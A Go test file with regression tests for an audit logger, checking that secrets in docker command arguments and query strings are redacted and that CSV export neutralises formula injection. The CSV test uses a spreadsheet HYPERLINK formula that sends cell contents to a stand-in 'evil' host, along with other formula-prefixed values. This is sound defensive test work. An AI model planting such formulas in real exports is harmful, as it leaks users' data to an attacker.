package audit

import (
	"strings"
	"testing"
)

// Regression tests for the 0.5 security review (L1, L2).

func TestCommandTargetHidesMoreSecrets(t *testing.T) {
	cases := []struct {
		args []string
		keep string
	}{
		{[]string{"run", "--env=DB_PASSWORD=hunter2", "img"}, "--env=DB_PASSWORD=***"},
		{[]string{"build", "--build-arg=NPM_TOKEN=hunter2", "."}, "--build-arg=NPM_TOKEN=***"},
		{[]string{"login", "-u", "bob", "-p", "hunter2", "reg"}, "-p *** reg"},
		{[]string{"clone", "https://u:hun/ter2@git.example/x"}, "https://u:***@git.example/x"},
		{[]string{"sh", "-c", "curl -H 'Authorization: Bearer hunter2' x"}, "Bearer ***"},
		{[]string{"sh", "-c", "curl -H 'Authorization: Basic aHVudGVyMg==' x"}, "Authorization: Basic ***"},
		{[]string{"-e", "API_KEY=hunter2"}, "API_KEY=***"},
	}
	for _, c := range cases {
		got := CommandTarget("docker", c.args)
		if strings.Contains(got, "hunter2") || strings.Contains(got, "ter2") || strings.Contains(got, "aHVudGVyMg") {
			t.Errorf("%q leaks: %s", c.args, got)
		}
		if !strings.Contains(got, c.keep) {
			t.Errorf("%q: %s does not contain %s", c.args, got, c.keep)
		}
	}
	// A port mapping after -p is not a password, and ordinary flags stay.
	if got := CommandTarget("docker", []string{"run", "-p", "8080:80", "--env=MODE=prod", "nginx"}); got != "docker run -p 8080:80 --env=MODE=prod nginx" {
		t.Errorf("over-redacted: %s", got)
	}
	if got := HTTPTarget("GET", "/v2/_catalog", "access%5Ftoken=hunter2&n=1"); strings.Contains(got, "hunter2") || !strings.Contains(got, "n=1") {
		t.Errorf("encoded key: %s", got)
	}
}

func TestCSVRecordQuotesEveryTextColumn(t *testing.T) {
	code := -1
	rec := CSVRecord(Entry{User: `=HYPERLINK("http://evil/?"&A1,"x")`, IP: "+1", Source: "-x", Plugin: "=1+1", Action: " @a", Via: "@SUM(1)", Result: "=r", Code: &code})
	for i, v := range rec {
		if i == 0 || i == 9 || i == 10 || i == 11 {
			continue // time, code, bytes, admin: written by the daemon
		}
		if v == "" {
			continue
		}
		if s := strings.TrimLeft(v, " "); strings.ContainsRune("=+-@", rune(s[0])) {
			t.Errorf("column %s not quoted: %q", CSVHeader[i], v)
		}
	}
	if rec[9] != "-1" {
		t.Errorf("exit code: %q", rec[9])
	}
}
